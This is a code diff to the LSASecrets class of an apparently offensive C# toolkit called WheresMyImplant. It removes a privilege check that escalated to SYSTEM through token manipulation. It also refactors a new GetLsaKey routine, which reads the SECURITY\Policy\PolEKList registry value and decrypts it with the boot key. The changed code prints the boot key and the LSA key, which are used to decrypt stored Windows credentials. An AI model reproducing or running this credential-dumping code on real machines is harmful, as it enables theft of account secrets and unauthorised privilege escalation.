@@ -15,30 +15,6 @@ namespace WheresMyImplant
 
         public LSASecrets()
         {
-            ////////////////////////////////////////////////////////////////////////////////
-            //
-            ////////////////////////////////////////////////////////////////////////////////
-            if (!WindowsIdentity.GetCurrent().IsSystem)
-            {
-                WriteOutputBad("Not running as SYSTEM, checking for Administrator access.");
-                if ((new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator))
-                {
-                    WriteOutputBad("Not running as Administrator, Exiting.");
-                    bailOut = true;
-                }
-                else
-                {
-                    Tokens tokenvator = new Tokens();
-                    tokenvator.GetSystem();
-                    if (!WindowsIdentity.GetCurrent().IsSystem)
-                    {
-                        WriteOutputBad("GetSystem Failed");
-                        bailOut = true;
-                        return;
-                    }
-                }
-            }
-            WriteOutputGood("Running as SYSTEM");
         }
 
         ////////////////////////////////////////////////////////////////////////////////
@@ -55,10 +31,9 @@ namespace WheresMyImplant
             }
 
             Byte[] bootKey = GetBootKey();
-            WriteOutputGood("[+] BootKey : " + BitConverter.ToString(bootKey));
-            Byte[] polEKList = (Byte[])Reg.ReadRegKey(Reg.HKEY_LOCAL_MACHINE, @"SECURITY\Policy\PolEKList", "");
-            Byte[] lsaKey = DecryptLsa(polEKList, bootKey);
-            lsaKey = lsaKey.Skip(68).Take(32).ToArray();
+            WriteOutputGood("BootKey : " + BitConverter.ToString(bootKey).Replace("-",""));
+            Byte[] lsaKey = GetLsaKey(bootKey);
+            WriteOutputGood("LSA Key : " + BitConverter.ToString(lsaKey).Replace("-", ""));
 
             foreach (String secret in secretSubKeys)
             {
@@ -159,6 +134,17 @@ namespace WheresMyImplant
                 }
             }
             return plaintextSecret;
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        //
+        ////////////////////////////////////////////////////////////////////////////////
+        public static Byte[] GetLsaKey(Byte[] bootKey)
+        {
+            Byte[] polEKList = (Byte[])Reg.ReadRegKey(Reg.HKEY_LOCAL_MACHINE, @"SECURITY\Policy\PolEKList", "");
+            Byte[] lsaKey = LSASecrets.DecryptLsa(polEKList, bootKey);
+            lsaKey = lsaKey.Skip(68).Take(32).ToArray();
+            return lsaKey;
         }
 
         ////////////////////////////////////////////////////////////////////////////////
